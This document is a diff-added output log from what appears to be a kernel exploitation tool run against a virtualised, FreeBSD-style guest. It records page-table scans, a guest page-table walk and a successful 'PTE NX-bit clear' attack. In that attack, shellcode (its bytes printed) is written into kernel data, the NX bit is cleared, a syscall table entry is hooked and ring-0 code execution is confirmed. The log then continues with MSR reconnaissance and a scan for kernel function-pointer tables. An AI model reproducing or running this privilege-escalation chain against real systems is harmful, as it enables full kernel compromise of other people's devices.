+[!] PT page at PA 0xfd6e000: 200 present entries, 0 kdata refs, 1 ktext refs
+    [192] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfd6f000: 211 present entries, 0 kdata refs, 2 ktext refs
+    [161] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [192] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfde1000: 173 present entries, 0 kdata refs, 2 ktext refs
+    [133] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [140] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfde2000: 202 present entries, 0 kdata refs, 1 ktext refs
+    [410] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfdec000: 216 present entries, 0 kdata refs, 1 ktext refs
+    [320] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfdef000: 190 present entries, 0 kdata refs, 2 ktext refs
+    [392] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [406] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfdfe000: 211 present entries, 0 kdata refs, 2 ktext refs
+    [283] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [297] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfe41000: 180 present entries, 0 kdata refs, 1 ktext refs
+    [ 36] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfe5b000: 175 present entries, 0 kdata refs, 1 ktext refs
+    [ 36] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfe81000: 185 present entries, 0 kdata refs, 1 ktext refs
+    [140] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfe83000: 225 present entries, 0 kdata refs, 1 ktext refs
+    [187] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfe99000: 152 present entries, 0 kdata refs, 1 ktext refs
+    [263] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfeaf000: 163 present entries, 0 kdata refs, 1 ktext refs
+    [215] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfef0000: 209 present entries, 1 kdata refs, 1 ktext refs
+    [235] 0xe900000012000003 → PA=0x12000000 4KB RW Kern NX
+
+[!] PT page at PA 0xfef7000: 226 present entries, 0 kdata refs, 1 ktext refs
+    [179] 0x88400000114d850f → PA=0x114d8000 4KB RW User NX
+
+[!] PT page at PA 0xff2c000: 220 present entries, 0 kdata refs, 1 ktext refs
+    [418] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xff48000: 234 present entries, 0 kdata refs, 3 ktext refs
+    [145] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [155] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [169] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xff53000: 205 present entries, 0 kdata refs, 2 ktext refs
+    [393] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [408] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xff85000: 212 present entries, 2 kdata refs, 2 ktext refs
+    [  0] 0x0000000011f9f421 → PA=0x11f9f000 4KB RO Kern X
+    [ 18] 0x0000000011f9f421 → PA=0x11f9f000 4KB RO Kern X
+
+[!] PT page at PA 0xffb5000: 196 present entries, 0 kdata refs, 1 ktext refs
+    [276] 0xa400000011000215 → PA=0x11000000 4KB RO User NX
+
+[!] PT page at PA 0xffc9000: 159 present entries, 0 kdata refs, 2 ktext refs
+    [ 73] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [ 87] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xffcd000: 234 present entries, 0 kdata refs, 1 ktext refs
+    [397] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfffe000: 226 present entries, 0 kdata refs, 1 ktext refs
+    [233] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    Scan: 256MB/512MB (65536 OK, 0 blocked, 585 PT refs found)
+
+[!] PT page at PA 0x10700000: 244 present entries, 0 kdata refs, 1 ktext refs
+    [473] 0x0000000010c144c7 → PA=0x10c14000 2MB RW User X
+
+[!] PT page at PA 0x10706000: 225 present entries, 0 kdata refs, 2 ktext refs
+    [308] 0x0000000010c144c7 → PA=0x10c14000 2MB RW User X
+    [317] 0x0000000010c144c7 → PA=0x10c14000 2MB RW User X
+
+[!] PT page at PA 0x1070a000: 198 present entries, 1 kdata refs, 0 ktext refs
+    [  1] 0x000000001300d501 → PA=0x1300d000 4KB RO Kern X
+
+[!] PT page at PA 0x1071a000: 72 present entries, 0 kdata refs, 2 ktext refs
+    [ 59] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [ 94] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0x10747000: 222 present entries, 0 kdata refs, 1 ktext refs
+    [154] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x1074c000: 255 present entries, 1 kdata refs, 1 ktext refs
+    [  9] 0xeb00000011be4101 → PA=0x11be4000 4KB RO Kern NX
+
+[!] PT page at PA 0x1076c000: 215 present entries, 0 kdata refs, 1 ktext refs
+    [450] 0xff00000010c50c8d → PA=0x10c50000 2MB RO User NX
+
+[!] PT page at PA 0x10774000: 199 present entries, 0 kdata refs, 2 ktext refs
+    [ 54] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [263] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x1077a000: 165 present entries, 0 kdata refs, 1 ktext refs
+    [296] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x1078c000: 63 present entries, 0 kdata refs, 2 ktext refs
+    [348] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [383] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0x1078f000: 30 present entries, 0 kdata refs, 2 ktext refs
+    [ 78] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [113] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0x107f0000: 168 present entries, 0 kdata refs, 1 ktext refs
+    [ 17] 0x00000000110cf621 → PA=0x110cf000 4KB RO Kern X
+
+[!] PT page at PA 0x108a8000: 238 present entries, 1 kdata refs, 1 ktext refs
+    [127] 0x0000000011e5e54b → PA=0x11e5e000 4KB RW Kern X
+
+[!] PT page at PA 0x108a9000: 204 present entries, 4 kdata refs, 1 ktext refs
+    [282] 0x00000000129d133d → PA=0x129d1000 4KB RO User X
+    [369] 0x00000000130feb1b → PA=0x130fe000 4KB RW Kern X
+    [427] 0x000000001314096b → PA=0x13140000 4KB RW Kern X
+    [485] 0x0000000013151833 → PA=0x13151000 4KB RW Kern X
+
+[!] PT page at PA 0x108aa000: 184 present entries, 2 kdata refs, 0 ktext refs
+    [  2] 0x0000000013152c1f → PA=0x13152000 4KB RW User X
+    [176] 0x0000000013618247 → PA=0x13618000 4KB RW User X
+
+[!] PT page at PA 0x10a20000: 207 present entries, 0 kdata refs, 1 ktext refs
+    [166] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x10a4c000: 208 present entries, 0 kdata refs, 1 ktext refs
+    [215] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x10a56000: 194 present entries, 0 kdata refs, 1 ktext refs
+    [350] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x10a57000: 207 present entries, 0 kdata refs, 1 ktext refs
+    [203] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x10a68000: 208 present entries, 0 kdata refs, 1 ktext refs
+    [271] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x10a77000: 193 present entries, 0 kdata refs, 2 ktext refs
+    [296] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [355] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x10a82000: 175 present entries, 0 kdata refs, 1 ktext refs
+    [162] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x10abb000: 201 present entries, 0 kdata refs, 1 ktext refs
+    [146] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x10abd000: 200 present entries, 0 kdata refs, 1 ktext refs
+    [433] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x10ac6000: 180 present entries, 0 kdata refs, 1 ktext refs
+    [269] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x10acf000: 208 present entries, 0 kdata refs, 1 ktext refs
+    [264] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x10adc000: 260 present entries, 0 kdata refs, 2 ktext refs
+    [133] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [195] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x10ade000: 173 present entries, 0 kdata refs, 1 ktext refs
+    [310] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x10aed000: 223 present entries, 1 kdata refs, 1 ktext refs
+    [119] 0x4800000011e90575 → PA=0x11e90000 4KB RO User X
+
+[!] PT page at PA 0x10b84000: 191 present entries, 0 kdata refs, 1 ktext refs
+    [194] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x10b86000: 215 present entries, 0 kdata refs, 1 ktext refs
+    [269] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x10b8e000: 219 present entries, 0 kdata refs, 2 ktext refs
+    [  5] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [ 13] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x10b90000: 201 present entries, 0 kdata refs, 1 ktext refs
+    [395] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x10bb9000: 222 present entries, 1 kdata refs, 1 ktext refs
+    [257] 0x0000000012004b01 → PA=0x12004000 4KB RO Kern X
+
+[!] PT page at PA 0x10bbc000: 200 present entries, 0 kdata refs, 1 ktext refs
+    [ 40] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x10bbd000: 204 present entries, 0 kdata refs, 1 ktext refs
+    [310] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x10bc3000: 199 present entries, 0 kdata refs, 1 ktext refs
+    [443] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x10bec000: 131 present entries, 0 kdata refs, 1 ktext refs
+    [ 95] 0xa270000011721a25 → PA=0x11721000 4KB RO User NX
+
+[*] NPT scan summary:
+    Pages scanned:   68960 OK, 62112 blocked
+    2MB regions:     135 accessible, 1 blocked
+    Blocked range:   first=0x10e00000, last=0x10e00000
+    VMCB candidates: 0
+    PT pages w/ kdata/ktext refs: 623
+
+=============================================
+  Guest Page Table Walk: Permission Analysis
+=============================================
+
+[*] Walking guest PT for ktext_base (VA=0xffffffff90d60000):
+    Indices: PML4[511] PDP[510] PD[134] PT[352]
+    PML4E: 0x00f0000018095023 (PA of entry: 0x18df2ff8)
+           P=1 RW=1 US=0 PWT=0 PCD=0 A=1 NX=0 → next PA=0x18095000
+    PDPE:  0x0000000018143023 (PA of entry: 0x18095ff0)
+           P=1 RW=1 US=0 PWT=0 PCD=0 A=1 PS=0 NX=0 → next PA=0x18143000
+    PDE:   0x0000000018097003 (PA of entry: 0x18143430)
+           P=1 RW=1 US=0 PWT=0 PCD=0 A=0 D=0 PS=0 G=0 NX=0 → next PA=0x18097000
+    PTE:   0x0400000010d60101 (PA of entry: 0x18097b00)
+           P=1 RW=0 US=0 PWT=0 PCD=0 A=0 D=0 PAT=0 G=1 NX=0 → PA=0x10d60000
+    >>> NX=0 RW=0 — this controls execution permission
+    PTE at PA 0x18097b00 — writable via DMAP 0xffff813318097b00
+
+[*] Walking guest PT for kdata_base (VA=0xffffffff91960000):
+    Indices: PML4[511] PDP[510] PD[140] PT[352]
+    PML4E: 0x00f0000018095023 (PA of entry: 0x18df2ff8)
+           P=1 RW=1 US=0 PWT=0 PCD=0 A=1 NX=0 → next PA=0x18095000
+    PDPE:  0x0000000018143023 (PA of entry: 0x18095ff0)
+           P=1 RW=1 US=0 PWT=0 PCD=0 A=1 PS=0 NX=0 → next PA=0x18143000
+    PDE:   0x000000001809d023 (PA of entry: 0x18143460)
+           P=1 RW=1 US=0 PWT=0 PCD=0 A=1 D=0 PS=0 G=0 NX=0 → next PA=0x1809d000
+    PTE:   0x8000000011960103 (PA of entry: 0x1809db00)
+           P=1 RW=1 US=0 PWT=0 PCD=0 A=0 D=0 PAT=0 G=1 NX=1 → PA=0x11960000
+    >>> NX=1 RW=1 — this controls execution permission
+    PTE at PA 0x1809db00 — writable via DMAP 0xffff81331809db00
+
+[*] Walking guest PT for kdata+0x1000 (VA=0xffffffff91961000):
+    Indices: PML4[511] PDP[510] PD[140] PT[353]
+    PML4E: 0x00f0000018095023 (PA of entry: 0x18df2ff8)
+           P=1 RW=1 US=0 PWT=0 PCD=0 A=1 NX=0 → next PA=0x18095000
+    PDPE:  0x0000000018143023 (PA of entry: 0x18095ff0)
+           P=1 RW=1 US=0 PWT=0 PCD=0 A=1 PS=0 NX=0 → next PA=0x18143000
+    PDE:   0x000000001809d023 (PA of entry: 0x18143460)
+           P=1 RW=1 US=0 PWT=0 PCD=0 A=1 D=0 PS=0 G=0 NX=0 → next PA=0x1809d000
+    PTE:   0x8000000011961103 (PA of entry: 0x1809db08)
+           P=1 RW=1 US=0 PWT=0 PCD=0 A=0 D=0 PAT=0 G=1 NX=1 → PA=0x11961000
+    >>> NX=1 RW=1 — this controls execution permission
+    PTE at PA 0x1809db08 — writable via DMAP 0xffff81331809db08
+
+=============================================
+  Ring-0 Execution: PTE NX-bit Clear Attack
+=============================================
+
+[*] Target: kdata_base KVA=0xffffffff91960000 PA=0x11960000
+[*] PTE at PA 0x1809db00: 0x8000000011960103
+    NX=1 RW=1 G=1 A=0
+
+[*] Step 1: Writing 26-byte shellcode to kdata via DMAP...
+    Write verify: OK
+    Bytes: 48 b8 00 40 50 52 37 81 ff ff 48 ba 47 4e 49 52 00 00 ad de 48 89 10 31 c0 c3 
+[*] Step 2: Clearing NX+G in guest PTE...
+    Old PTE: 0x8000000011960103 (NX=1 G=1)
+    New PTE: 0x0000000011960003 (NX=0 G=0)
+    PTE readback: 0x0000000011960003 [OK]
+[*] Step 3: Clearing shared buffer...
+[*] Step 4: Hooking sysent[253] → kdata_base (0xffffffff91960000)...
+    sysent[253].sy_call = 0xffffffff91960000 [OK]
+[*] Calling syscall(253) — executing shellcode in ring 0...
+    syscall(253) returned: 0, errno=0
+[*] Step 5: Restoring PTE, sysent, code cave...
+    All restored.
+
+[*] Shared buffer value: 0xdead000052494e47
+[+] ============================================
+[+]  RING-0 CODE EXECUTION CONFIRMED!
+[+] ============================================
+[+] Shellcode wrote magic 0xdead000052494e47 to shared buffer.
+[+] Attack chain: PTE NX-clear + sysent hook → ring 0
+[+] We have arbitrary kernel code execution.
+
+=============================================
+  Ring-0 Phase 2: MSR/CR Reconnaissance
+=============================================
+
+[*] MSR recon shellcode: 455 bytes
+[*] Writing MSR shellcode to kdata code cave...
+    Write verify: OK
+[*] Clearing NX+G in PTE for MSR shellcode...
+[*] Hooking sysent[253] → kdata_base...
+[*] Calling syscall(253) — MSR/CR recon in ring 0...
+    syscall(253) returned: 0, errno=0
+[*] Restoring PTE, sysent, code cave...
+    All restored.
+
+[+] ============================================
+[+]  MSR/CR RECON COMPLETE — 12 entries
+[+] ============================================
+
+    ???          (0x00000000) = 0x00000001c0000082
+    ???          (0x90ff4218) = 0x00000001c0000084
+    ???          (0x00004701) = 0x00000001c0000100
+    ???          (0xff800080) = 0x00000001c0000101
+    ???          (0x97e33480) = 0x00000001c0000102
+    ???          (0x00000000) = 0x00000001c0000103
+    ???          (0x0000000d) = 0x000000010000001b
+    ???          (0xfee00800) = 0x00000001ffff0000
+    ???          (0x8005003b) = 0x00000001ffff0003
+    ???          (0x18df2000) = 0x00000001ffff0004
+    ???          (0x00340ee0) = 0x0000000000000000
+    ???          (0x00000000) = 0x0000000000000000
+
+=============================================
+  Ring-0 Phase 3: APIC Ops Discovery
+=============================================
+
+[*] Scanning kdata for function pointer tables (apic_ops)...
+[*] Looking for clusters of 4+ consecutive ktext pointers.
+    ktext ptr range: 0xffffffff90d60000 — 0xffffffff92d60000 (32MB)
+    kdata scan: 0xffffffff91960000 — 0xffffffff92160000 (8MB)
+
+[*] Direct check at known offset kdata+0x170650...
+    Found 0 consecutive ktext ptrs at known offset
+    Only 0 ptrs — offset may differ on this boot
+
+[*] Full scan for other vtables...
+    ...scanning kdata+0x100000 (1MB/8MB)    [TABLE] kdata+0x153fb0: 6 ktext ptrs
+    [TABLE] kdata+0x155ce0: 4 ktext ptrs
+    [TABLE] kdata+0x155ed0: 5 ktext ptrs
+    [TABLE] kdata+0x156190: 5 ktext ptrs
+    [TABLE] kdata+0x1565e8: 13 ktext ptrs
+    [TABLE] kdata+0x156c50: 8 ktext ptrs
+    [TABLE] kdata+0x156cb8: 4 ktext ptrs
+    [TABLE] kdata+0x156da0: 6 ktext ptrs
+    [TABLE] kdata+0x156df8: 4 ktext ptrs
+    [TABLE] kdata+0x156e20: 6 ktext ptrs
+    [TABLE] kdata+0x156e58: 12 ktext ptrs
+    [TABLE] kdata+0x156ec8: 6 ktext ptrs
+    [TABLE] kdata+0x158190: 12 ktext ptrs
+    [TABLE] kdata+0x1583d8: 4 ktext ptrs
+    [TABLE] kdata+0x1584c8: 4 ktext ptrs
+    [TABLE] kdata+0x1586a8: 5 ktext ptrs
+    [TABLE] kdata+0x158740: 4 ktext ptrs
+    [TABLE] kdata+0x1588a8: 4 ktext ptrs
+    [TABLE] kdata+0x158920: 4 ktext ptrs
+    [TABLE] kdata+0x158998: 4 ktext ptrs
+    [TABLE] kdata+0x1589f0: 4 ktext ptrs
+    [TABLE] kdata+0x158a68: 7 ktext ptrs
+    [TABLE] kdata+0x158aa8: 5 ktext ptrs
+    [TABLE] kdata+0x158ae0: 6 ktext ptrs
+    [TABLE] kdata+0x158b20: 6 ktext ptrs
+    [TABLE] kdata+0x158b60: 6 ktext ptrs
+    [TABLE] kdata+0x158d10: 6 ktext ptrs
+    [TABLE] kdata+0x158df0: 6 ktext ptrs
+    [TABLE] kdata+0x158e60: 9 ktext ptrs
+    [TABLE] kdata+0x159080: 9 ktext ptrs
+    [TABLE] kdata+0x1590f8: 13 ktext ptrs
+    [TABLE] kdata+0x159168: 4 ktext ptrs
+    [TABLE] kdata+0x1591a0: 4 ktext ptrs
+    [TABLE] kdata+0x1591d0: 6 ktext ptrs
+    [TABLE] kdata+0x159270: 12 ktext ptrs
+    [TABLE] kdata+0x159300: 8 ktext ptrs
+    [TABLE] kdata+0x159370: 6 ktext ptrs
+    [TABLE] kdata+0x159410: 12 ktext ptrs
+    [TABLE] kdata+0x159480: 12 ktext ptrs
+    [TABLE] kdata+0x1595a0: 14 ktext ptrs
+    [TABLE] kdata+0x1596d0: 6 ktext ptrs
+    [TABLE] kdata+0x159828: 12 ktext ptrs
+    [TABLE] kdata+0x159890: 12 ktext ptrs
+    [TABLE] kdata+0x159a90: 12 ktext ptrs
+    [TABLE] kdata+0x159b00: 8 ktext ptrs
+    [TABLE] kdata+0x15a280: 12 ktext ptrs
+    [TABLE] kdata+0x15ae50: 4 ktext ptrs
+    [TABLE] kdata+0x15ae80: 8 ktext ptrs
+    [TABLE] kdata+0x15af40: 6 ktext ptrs
+    [TABLE] kdata+0x15afd0: 8 ktext ptrs
+    [TABLE] kdata+0x15b0a0: 8 ktext ptrs
+    [TABLE] kdata+0x15b200: 8 ktext ptrs
+    [TABLE] kdata+0x15b950: 4 ktext ptrs
+    [TABLE] kdata+0x15bf00: 12 ktext ptrs
+    [TABLE] kdata+0x1654d0: 18 ktext ptrs
+    [TABLE] kdata+0x165570: 7 ktext ptrs
+    [TABLE] kdata+0x165600: 8 ktext ptrs
+    [TABLE] kdata+0x1656b0: 28 ktext ptrs
+      -> 27/28 unique, spread=0x1b18 (6KB) [BEST apic_ops candidate]
+      [ 0] 0xffffffff90ff7758  (ktext+0x297758)
+      [ 1] 0xffffffff90ff7758  (ktext+0x297758)
+      [ 2] 0xffffffff90ff7908  (ktext+0x297908)
+      [ 3] 0xffffffff90ff8cc8  (ktext+0x298cc8)
+      [ 4] 0xffffffff90ff71b0  (ktext+0x2971b0)
+      [ 5] 0xffffffff90ff81e0  (ktext+0x2981e0)
+      [ 6] 0xffffffff90ff7f28  (ktext+0x297f28)
+      [ 7] 0xffffffff90ff8270  (ktext+0x298270)
+      [ 8] 0xffffffff90ff8910  (ktext+0x298910)
+      [ 9] 0xffffffff90ff72c0  (ktext+0x2972c0)
+      [10] 0xffffffff90ff8ad8  (ktext+0x298ad8)
+      [11] 0xffffffff90ff7fd0  (ktext+0x297fd0)
+      [12] 0xffffffff90ff8c48  (ktext+0x298c48)
+      [13] 0xffffffff90ff7e58  (ktext+0x297e58)
+      [14] 0xffffffff90ff74c8  (ktext+0x2974c8)
+      [15] 0xffffffff90ff8a58  (ktext+0x298a58)
+      [16] 0xffffffff90ff8c78  (ktext+0x298c78)
+      [17] 0xffffffff90ff7db8  (ktext+0x297db8)
+      [18] 0xffffffff90ff7d50  (ktext+0x297d50)
+      [19] 0xffffffff90ff79c0  (ktext+0x2979c0)
+      [20] 0xffffffff90ff8048  (ktext+0x298048)
+      [21] 0xffffffff90ff7998  (ktext+0x297998)
+      [22] 0xffffffff90ff89d8  (ktext+0x2989d8)
+      [23] 0xffffffff90ff81f8  (ktext+0x2981f8)
+      [24] 0xffffffff90ff7560  (ktext+0x297560)
+      [25] 0xffffffff90ff7808  (ktext+0x297808)
+      [26] 0xffffffff90ff8160  (ktext+0x298160)
+      [27] 0xffffffff90ff80b0  (ktext+0x2980b0)
+    [TABLE] kdata+0x165830: 6 ktext ptrs
+    [TABLE] kdata+0x1658c0: 26 ktext ptrs
+      -> 26/26 unique, spread=0x1690ab8 (23106KB)
+      [ 0] 0xffffffff9267dd28  (ktext+0x191dd28)
+      [ 1] 0xffffffff90fed408  (ktext+0x28d408)
+      [ 2] 0xffffffff9267dd40  (ktext+0x191dd40)
+      [ 3] 0xffffffff90ff7ab0  (ktext+0x297ab0)
+      [ 4] 0xffffffff9267dd88  (ktext+0x191dd88)
+      [ 5] 0xffffffff90fef5d0  (ktext+0x28f5d0)
+      [ 6] 0xffffffff9267dda0  (ktext+0x191dda0)
+      [ 7] 0xffffffff90feffd8  (ktext+0x28ffd8)
+      [ 8] 0xffffffff9267ddb8  (ktext+0x191ddb8)
+      [ 9] 0xffffffff90feffe8  (ktext+0x28ffe8)
+      [10] 0xffffffff9267ddd0  (ktext+0x191ddd0)
+      [11] 0xffffffff91147f10  (ktext+0x3e7f10)
+      [12] 0xffffffff9267de30  (ktext+0x191de30)
+      [13] 0xffffffff90ff27d0  (ktext+0x2927d0)
+      [14] 0xffffffff9267de48  (ktext+0x191de48)
+      [15] 0xffffffff90ff20e0  (ktext+0x2920e0)
+      [16] 0xffffffff9267de60  (ktext+0x191de60)
+      [17] 0xffffffff90ff2548  (ktext+0x292548)
+      [18] 0xffffffff9267dec0  (ktext+0x191dec0)
+      [19] 0xffffffff90ff0c80  (ktext+0x290c80)
+      [20] 0xffffffff9267dde8  (ktext+0x191dde8)
+      [21] 0xffffffff90fed488  (ktext+0x28d488)
+      [22] 0xffffffff9267de78  (ktext+0x191de78)
+      [23] 0xffffffff90ff4b00  (ktext+0x294b00)
+      [24] 0xffffffff9267de90  (ktext+0x191de90)
+      [25] 0xffffffff90ff4a70  (ktext+0x294a70)
+    [TABLE] kdata+0x165ae8: 4 ktext ptrs
+    [TABLE] kdata+0x1666f8: 5 ktext ptrs
+    [TABLE] kdata+0x1667c0: 4 ktext ptrs
+    [TABLE] kdata+0x166920: 4 ktext ptrs
+    [TABLE] kdata+0x166e30: 8 ktext ptrs
+    [TABLE] kdata+0x166f30: 10 ktext ptrs
+    [TABLE] kdata+0x168190: 29 ktext ptrs
+      -> 29/29 unique, spread=0x3c0 (0KB)
+      [ 0] 0xffffffff9267cee0  (ktext+0x191cee0)
+      [ 1] 0xffffffff9267cf00  (ktext+0x191cf00)
+      [ 2] 0xffffffff9267cf40  (ktext+0x191cf40)
+      [ 3] 0xffffffff9267cf20  (ktext+0x191cf20)
+      [ 4] 0xffffffff9267d080  (ktext+0x191d080)
+      [ 5] 0xffffffff9267d0a0  (ktext+0x191d0a0)
+      [ 6] 0xffffffff9267d0c0  (ktext+0x191d0c0)
+      [ 7] 0xffffffff9267d0e0  (ktext+0x191d0e0)
+      [ 8] 0xffffffff9267d100  (ktext+0x191d100)
+      [ 9] 0xffffffff9267d000  (ktext+0x191d000)
+      [10] 0xffffffff9267d020  (ktext+0x191d020)
+      [11] 0xffffffff9267d120  (ktext+0x191d120)
+      [12] 0xffffffff9267d140  (ktext+0x191d140)
+      [13] 0xffffffff9267d040  (ktext+0x191d040)
+      [14] 0xffffffff9267cf60  (ktext+0x191cf60)
+      [15] 0xffffffff9267d160  (ktext+0x191d160)
+      [16] 0xffffffff9267d180  (ktext+0x191d180)
+      [17] 0xffffffff9267d1a0  (ktext+0x191d1a0)
+      [18] 0xffffffff9267d1c0  (ktext+0x191d1c0)
+      [19] 0xffffffff9267cfc0  (ktext+0x191cfc0)
+      [20] 0xffffffff9267d1e0  (ktext+0x191d1e0)
+      [21] 0xffffffff9267d200  (ktext+0x191d200)
+      [22] 0xffffffff9267d220  (ktext+0x191d220)
+      [23] 0xffffffff9267d240  (ktext+0x191d240)
+      [24] 0xffffffff9267d060  (ktext+0x191d060)
+      [25] 0xffffffff9267d260  (ktext+0x191d260)
+      [26] 0xffffffff9267cfe0  (ktext+0x191cfe0)
+      [27] 0xffffffff9267d280  (ktext+0x191d280)
+      [28] 0xffffffff9267d2a0  (ktext+0x191d2a0)
+    [TABLE] kdata+0x170300: 12 ktext ptrs
+    [TABLE] kdata+0x1703d0: 12 ktext ptrs
+    [TABLE] kdata+0x170440: 4 ktext ptrs
+    [TABLE] kdata+0x1704d0: 12 ktext ptrs
+    [TABLE] kdata+0x170540: 10 ktext ptrs
+    [TABLE] kdata+0x1705f0: 10 ktext ptrs
+    [TABLE] kdata+0x170740: 8 ktext ptrs
+    [TABLE] kdata+0x1707d0: 8 ktext ptrs
+    [TABLE] kdata+0x179180: 12 ktext ptrs
+    [TABLE] kdata+0x1791f0: 13 ktext ptrs
+    [TABLE] kdata+0x179268: 18 ktext ptrs
+    [TABLE] kdata+0x179308: 13 ktext ptrs
+    [TABLE] kdata+0x179380: 5 ktext ptrs
+    [TABLE] kdata+0x1793c0: 5 ktext ptrs
+    [TABLE] kdata+0x1793f8: 5 ktext ptrs
+    [TABLE] kdata+0x179438: 5 ktext ptrs
+    [TABLE] kdata+0x179810: 10 ktext ptrs
+    [TABLE] kdata+0x179888: 11 ktext ptrs
+    [TABLE] kdata+0x1798f0: 28 ktext ptrs
+      -> 28/28 unique, spread=0x135f798 (19837KB)
+      [ 0] 0xffffffff9234d908  (ktext+0x15ed908)
+      [ 1] 0xffffffff90fffdf0  (ktext+0x29fdf0)
+      [ 2] 0xffffffff9234d920  (ktext+0x15ed920)
+      [ 3] 0xffffffff90fffdd8  (ktext+0x29fdd8)
+      [ 4] 0xffffffff9234d938  (ktext+0x15ed938)
+      [ 5] 0xffffffff90ffebf0  (ktext+0x29ebf0)
+      [ 6] 0xffffffff9234d950  (ktext+0x15ed950)
+      [ 7] 0xffffffff90ff46e8  (ktext+0x2946e8)
+      [ 8] 0xffffffff9234d968  (ktext+0x15ed968)
+      [ 9] 0xffffffff91000490  (ktext+0x2a0490)
+      [10] 0xffffffff9234d980  (ktext+0x15ed980)
+      [11] 0xffffffff90fee2a8  (ktext+0x28e2a8)
+      [12] 0xffffffff9234d998  (ktext+0x15ed998)
+      [13] 0xffffffff90fffba0  (ktext+0x29fba0)
+      [14] 0xffffffff9234d9b0  (ktext+0x15ed9b0)
+      [15] 0xffffffff90feef70  (ktext+0x28ef70)
+      [16] 0xffffffff9234d9c8  (ktext+0x15ed9c8)
+      [17] 0xffffffff910000f0  (ktext+0x2a00f0)
+      [18] 0xffffffff9234d9e0  (ktext+0x15ed9e0)
+      [19] 0xffffffff91000bd8  (ktext+0x2a0bd8)
+      [20] 0xffffffff9234d9f8  (ktext+0x15ed9f8)
+      [21] 0xffffffff90ff4610  (ktext+0x294610)
+      [22] 0xffffffff9234da10  (ktext+0x15eda10)
+      [23] 0xffffffff91000cb0  (ktext+0x2a0cb0)
+      [24] 0xffffffff9234da28  (ktext+0x15eda28)
+      [25] 0xffffffff90ffbf98  (ktext+0x29bf98)
+      [26] 0xffffffff9234da40  (ktext+0x15eda40)
+      [27] 0xffffffff90ffa110  (ktext+0x29a110)
+    [TABLE] kdata+0x1799e0: 10 ktext ptrs
